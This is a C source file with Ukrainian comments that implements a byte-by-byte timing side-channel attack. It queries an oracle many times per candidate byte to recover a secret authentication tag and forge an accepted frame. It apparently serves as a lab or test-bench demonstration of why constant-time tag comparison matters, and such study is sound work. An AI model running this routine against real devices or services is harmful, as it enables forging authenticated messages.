#include "attack.h"

#include <string.h>

/* Скільки разів надіслати той самий кадр, щоб усереднити джитер стенда.
   На чистій моделі вистачило б одного пострілу — на живому залізі ні. */
#define PROBES_PER_GUESS 24u

/* Чим забиваємо ще не підібраний хвіст тегу. Значення не важить:
   ці байти й так майже напевно не збігаються з секретом. */
#define FILLER_BYTE 0xCCu

attack_report attack_recover_tag(oracle *o)
{
    attack_report report;
    uint8_t guess[TAG_LEN];
    uint64_t start_queries = o->queries;
    size_t pos;

    memset(&report, 0, sizeof report);
    memset(guess, (int)FILLER_BYTE, sizeof guess);

    for (pos = 0; pos < TAG_LEN; ++pos) {
        uint64_t best_cost = 0;
        unsigned best_byte = 0;
        unsigned candidate;
        int decided = 0;

        for (candidate = 0; candidate < 256u; ++candidate) {
            uint64_t cost_sum = 0;
            unsigned probe;

            guess[pos] = (uint8_t)candidate;

            for (probe = 0; probe < PROBES_PER_GUESS; ++probe) {
                if (oracle_ask(o, guess)) {
                    /* Останній байт підібрано: приймач прийняв цілий кадр.
                       Далі шукати нічого. */
                    memcpy(report.tag, guess, TAG_LEN);
                    report.accepted = 1;
                    report.queries = o->queries - start_queries;
                    return report;
                }
                cost_sum += (uint64_t)oracle_last_cost(o);
            }

            /* Строге «більше» лишає перший максимум: за сталого часу всі
               кандидати рівні, і нападник не дістає ніякої переваги. */
            if (!decided || cost_sum > best_cost) {
                best_cost = cost_sum;
                best_byte = candidate;
                decided = 1;
            }
        }

        guess[pos] = (uint8_t)best_byte;
    }

    /* Хвіст зібрано, але прийняття ще не було — питаємо приймач прямо. */
    memcpy(report.tag, guess, TAG_LEN);
    report.accepted = oracle_ask(o, guess);
    report.queries = o->queries - start_queries;
    return report;
}
